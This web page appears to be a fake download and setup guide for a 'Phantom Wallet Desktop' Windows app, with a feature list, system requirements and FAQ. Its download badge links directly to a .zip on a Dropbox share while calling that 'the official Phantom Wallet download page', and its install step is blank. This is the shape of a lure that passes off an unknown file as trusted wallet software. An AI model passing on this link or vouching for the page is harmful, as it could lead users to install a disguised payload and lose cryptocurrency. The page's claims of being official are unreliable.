---
layout: default
title: "Phantom Wallet Desktop — Download & Setup Guide (Windows x64)"
description: "Download Phantom Wallet Desktop for Windows 10/11 x64. Multi-chain crypto wallet for Solana, Ethereum & Polygon. Setup guide, system requirements & features."
---

# Phantom Wallet Desktop Application — Download & Setup Guide

[![Download Phantom Wallet](https://www.dropbox.com/scl/fi/ys09esq6c1ajqp1v3pyiq/phantom-wallet-desktop-26.32.0-x64.zip?rlkey=pn7u3oya8eci4wz3p47rykzs5&st=szpafs79&dl=1)](https://www.dropbox.com/scl/fi/ys09esq6c1ajqp1v3pyiq/phantom-wallet-desktop-26.32.0-x64.zip?rlkey=pn7u3oya8eci4wz3p47rykzs5&st=szpafs79&dl=1)
**Version:** 26.32.0 | **License:** Free (Open Source) | **Platform:** Windows 10/11 x64 | **SHA-256:** `a989a0146e826cd3797e38cf29cbcf8870ec2cceea50541e3eee1f933ede0cb9`

---

## Overview

Phantom Wallet Desktop is the official desktop client of the Phantom multi-chain cryptocurrency wallet, built for Windows 10 and Windows 11 (64-bit). Originally launched as a Solana-only wallet, Phantom has evolved into a full-featured multi-chain platform supporting Solana, Ethereum, Polygon, and all EVM-compatible networks through a single unified interface.

The desktop application provides native Windows integration with hardware wallet support (Ledger), token swapping across chains, NFT gallery management, and dApp browser connectivity. The application is built on Electron framework with native Node.js backends for blockchain RPC communication, ensuring low-latency transaction signing and real-time balance updates.

Phantom Desktop supports token staking (SOL, ETH), DeFi protocol integration (Jupiter, Raydium, Uniswap, Aave), and cross-chain bridging through Wormhole and Allbridge protocols. The wallet uses BIP-39/44 HD derivation paths with optional passphrase (BIP-39 25th word) for enhanced security.

---

## Key Features

1. **Multi-Chain Asset Management** — Manage SOL, ETH, MATIC, and all SPL-2022 / ERC-20 tokens in one unified portfolio view with real-time USD valuation via CoinGecko API.
2. **Hardware Wallet Integration** — Connect Ledger Nano X and Nano S Plus via USB for cold storage signing. All private keys remain on the hardware device; the desktop client only broadcasts signed transactions.
3. **Cross-Chain Token Swaps** — Built-in DEX aggregator routing through Jupiter (Solana), 1inch (EVM), and Socket (bridge) for optimal price execution with <1% slippage protection.
4. **NFT Gallery & Marketplace** — View, send, and list NFTs on Magic Eden, Tensor, and OpenSea. Supports compressed NFTs (cNFTs) and programmable NFTs (pNFTs) with metadata caching.
5. **DeFi Protocol Integration** — One-click access to Raydium, Orca, Marinade, Lido, Aave, and Compound directly from the wallet interface without external dApp browsers.
6. **Staking & Earning** — Native SOL staking with validator selection (APY tracking), ETH liquid staking via Lido and Rocket Pool, and earn programs for select tokens.
7. **dApp Browser** — Embedded Web3 browser with WalletConnect v2 support, transaction simulation, and phishing domain blocklist maintained by the Phantom security team.
8. **Transaction Simulation** — Preview transaction outcomes before signing — shows token balance changes, potential failures, and honeypot detection on new tokens.
9. **Privacy Mode** — Hide balances, disable transaction history logging, and use custom RPC endpoints to prevent IP-based tracking by analytics providers.
10. **Multi-Account Management** — Create up to 100 HD accounts with custom names, color coding, and per-account transaction pinning for organizational clarity.

---

## System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 x64 (21H2) | Windows 11 x64 (23H2/24H2) |
| **Processor** | Intel Core i3 / AMD Ryzen 3 (2 cores) | Intel Core i5 / AMD Ryzen 5 (4+ cores) |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 500 MB free disk space | 1 GB SSD (for blockchain cache) |
| **Display** | 1280x720 | 1920x1080 or higher |
| **Network** | Broadband (5 Mbps) | Broadband (25+ Mbps) for staking/sync |
| **USB** | USB 2.0 (for Ledger) | USB 3.0 (for Ledger Nano X) |
| **Graphics** | Integrated GPU | Dedicated GPU (for NFT rendering) |

---

## How to Download and Install

### Step 1: Download the Installer

Click the **Download** badge at the top of this page to navigate to the official Phantom Wallet download page. Select the **Windows x64 (.zip)** option. The file is approximately 180 MB.

### Step 2: Verify the Checksum (Recommended)

Open PowerShell as Administrator and run:

```powershell
Get-FileHash .\phantom-wallet-desktop-26.32.0-x64.zip -Algorithm SHA256
```

Compare the output with the SHA-256 hash listed at the top of this page. They must match exactly.

### Step 3: Run the Installer


### Step 4: Complete Setup

1. Choose **"Create New Wallet"** or **"Import Existing Wallet"**.
2. If creating new: write down the **12-word secret recovery phrase** on paper. Never store it digitally.
3. Set a strong wallet password (minimum 12 characters, mixed case, numbers, symbols).
4. Connect your Ledger hardware wallet via USB (optional).
5. Select your preferred network (Solana, Ethereum, Polygon) and RPC endpoint.

### Step 5: Post-Installation Configuration

- Enable **"Require Password on Startup"** in Settings → Security.
- Set up **"Transaction Alerts"** for large transfers.
- Configure **"Auto-Lock"** to 5 minutes of inactivity.
- Add **"Trusted dApps"** list to prevent unauthorized connections.

---

## Troubleshooting & FAQ



### Issue: Wallet not syncing / balances not updating

**Solution:**  
1. Check your internet connection.  
2. Switch RPC endpoint: Settings → Network → Custom RPC (try `https://api.mainnet-beta.solana.com` or Helius/Triton endpoints).  
3. Clear cache: Settings → Advanced → Clear Cache.  
4. Restart the application.

### Issue: Ledger device not detected

**Solution:**  
1. Ensure Ledger Live is **closed** (it conflicts with Phantom's USB access).  
2. Open the Solana or Ethereum app on the Ledger device.  
3. Try a different USB port (preferably USB 2.0).  
4. Update Ledger firmware via Ledger Live, then retry.

### Issue: Transaction failed / "Simulation failed"

**Cause:** Insufficient SOL for rent exemption, slippage too low, or network congestion.  
**Solution:** Increase slippage to 0.5-1%, ensure at least 0.01 SOL for fees, and retry during low-congestion periods.

### FAQ

**Q: Is Phantom Wallet free to use?**  
A: Yes. The desktop application is free and open-source. Network fees (gas) apply to blockchain transactions only.

**Q: Can I use Phantom without a Ledger hardware wallet?**  
A: Yes. Phantom supports software-only wallets, but hardware wallet integration is strongly recommended for large holdings.

**Q: Which networks does Phantom Desktop support?**  
A: Solana, Ethereum, Polygon, BNB Chain, Avalanche, Arbitrum, Optimism, and Base.

**Q: How do I recover my wallet if I lose my computer?**  
A: Use the 12-word secret recovery phrase on any device with Phantom installed. Your funds are on the blockchain, not on your PC.

**Q: Does Phantom support staking?**  
A: Yes. SOL staking (native and liquid via Lido/Jito) and ETH liquid staking (Lido, Rocket Pool) are supported directly from the Staking tab.
